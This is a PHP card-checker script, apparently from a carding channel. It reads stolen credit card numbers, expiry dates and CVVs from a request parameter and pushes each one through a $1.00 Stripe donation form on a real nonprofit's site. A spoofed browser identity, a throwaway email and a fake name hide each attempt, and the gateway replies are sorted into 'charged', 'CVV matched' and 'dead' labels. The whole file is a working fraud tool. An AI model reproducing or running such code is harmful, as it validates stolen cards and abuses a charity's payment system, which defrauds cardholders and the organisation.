<?php

#/// API Made By: @A_Melodious_Soul aka Melodious Soul ❣🥀
#/// Channel & Chat: @BinBhai & @BinBhaiFamily | 🏴‍☠️【Bв™】
#/// Rest API
#/// Gate: [Stripe Charge $1.00]
#/// Total Requests: [01]
#/// Site Type: [SHOP CHECKOUT]
#/// Site: [https://2life.tfaforms.net/]
#/// Use Proxy/VPN Enjoy_xD...!!!

#---///Credits\\\---#

$credits = "[TKKYTRSCCS]"; /// PUT YOUR NAME

#---///[I Am Using ProxyLess Checker Here]\\\---#

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');

#---///[START]\\\---#

if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

#---///A [0-0-0]\\\---#

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (empty($lista)) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#Dead </i></font> <font class="badge badge-warning">『 ★ Bete Enter Your CC First ★ 』</i></font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
    die();
};

if (strlen($mes) == 2) { 
  $mes = str_replace("0","",$mes); 
}
if (strlen($ano) == 2) $ano = "20$ano";

$mail   = "binbhaia000".substr(md5(uniqid()),0,8)."@gmail.com";

$User_Agent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';

#---///1st Request [Auth/Charge]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://2life.tfaforms.net/api_v2/workflow/processor');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: 2life.tfaforms.net',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language: en-US,en;q=0.5',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://2lifecommunities.org',
'Referer: https://2lifecommunities.org/',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: cross-site',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'tfa_92=tfa_93&tfa_86=tfa_102&tfa_103=1&tfa_355=1&tfa_95=tfa_96&tfa_76=jackie&tfa_77='.$cc.'&tfa_78='.$mes.'&tfa_80='.$ano.'&tfa_83='.$cvv.'&tfa_7=street+57&tfa_8=nyc&tfa_285=tfa_318&tfa_71=10080&tfa_354=1&tfa_9=&tfa_174=1&tfa_353=1.00&tfa_280='.$mail.'&tfa_281=jackie&tfa_282=jackie+peterson&tfa_104=&tfa_284=&tfa_190=&tfa_273=jackie&tfa_274=peterson&tfa_275='.$mail.'&tfa_277=&tfa_278=&tfa_189=&STRIPE_CUSTOMER_31=&STRIPE_PAYMENT_METHOD_31=&STRIPE_PAYMENT_INTENT_31=&STRIPE_SETUP_INTENT_31=&STRIPE_SUBSCR_31=&STRIPE_CHARGE_31=&tfa_dbFormId=25&tfa_dbResponseId=&tfa_dbControl=c8faecccb8ebe8b7b6af18c7813d7518&tfa_dbWorkflowSessionUuid=&tfa_dbVersionId=4&tfa_switchedoff=tfa_109');
$result = curl_exec($ch);
$time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Respo = getstr($result, 'An error occurred while processing your payment. ','</a>');

#-----[CVV [CHARGED] Response]-----#

if ((strpos($result, 'Thank You.')) || (strpos($result, 'Your Utiliz account is now active.')) || (strpos($result, 'We just sent you an email with full instructions.')) || (strpos($result, 'your subscription complete!')) || (strpos($result, 'Thank you for subscription')) || (strpos($result, 'Thank you for subscription!')) || (strpos($result, 'Thank you for order')) || (strpos($result, 'order placed successfully')) || (strpos($result, '"status": "succeeded"')) || (strpos($result, '"status":"succeeded"')) || (strpos($result, 'status": "succeeded'))){
echo '<font size=3.5 color="white"><font class="badge badge-success">#CHARGED </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV Charged $1.00 | [Your Donation Was Successfully Proceed!] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV AVS Failed Response]-----#

elseif ((strpos($result, 'zip code validation failed.')) || (strpos($result, 'incorrect_zip')) || (strpos($result, 'zip code is incorrect.'))) { 
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV Insufficient Funds Response]-----#

elseif (strpos($result,"Your card has insufficient funds.")){
echo '<font size=3.5 color="white"><font class="badge badge-success">#CVV </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CCN Response]-----#

elseif (strpos($result,"security code is incorrect.")){
echo '<font size=3.5 color="white"><font class="badge badge-success">#CCN</i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CCN LIVE | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[DEAD Response]-----#

elseif (strpos($result, $Respo)){
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Dead </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | ['.$Respo.'] ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

else {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | Try Again or Contact To Host To Fix This..! @TKKYTRS ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Stripe Charge $1.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';

file_put_contents('Stripe_Error.txt', $lista.$result.PHP_EOL , FILE_APPEND | LOCK_EX);

}


//echo "<br><b>1:</b> $result<br><br>";
//echo "<br><b>RESPONSE:</b> $Respo<br><br>";

curl_close($ch);
ob_flush();

#---///[THE END]\\\---#

sleep(1);

?>